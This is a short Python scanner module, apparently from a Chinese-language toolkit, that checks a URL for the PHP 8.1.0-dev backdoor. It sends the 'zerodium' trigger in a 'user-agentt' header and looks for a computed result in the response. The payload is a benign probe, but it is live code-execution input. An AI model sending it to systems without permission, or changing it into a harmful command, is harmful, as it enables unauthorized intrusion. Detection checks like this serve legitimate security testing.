import requests
import re
from bs4 import BeautifulSoup
import logging

uia=''
http = ''
https = ''
def dl20(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'user-agentt': 'zerodiumvar_dump(98*98);'}
        logging.captureWarnings(True)
        gf = requests.get(url,cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        gf.encoding = 'utf-8'
        jx = BeautifulSoup(gf.text, 'html.parser')
        if 'int(9604)' in jx.text:
            uia = '[+]存在后门'
        else:
            uia = '[-]后门不存在'
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt():
    global uia
    return '--------------------------------------------------\n[ PHP 8.1.0-dev 开发版本后门 ]\n\n'+ str (uia)+'\n'
def yt1(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)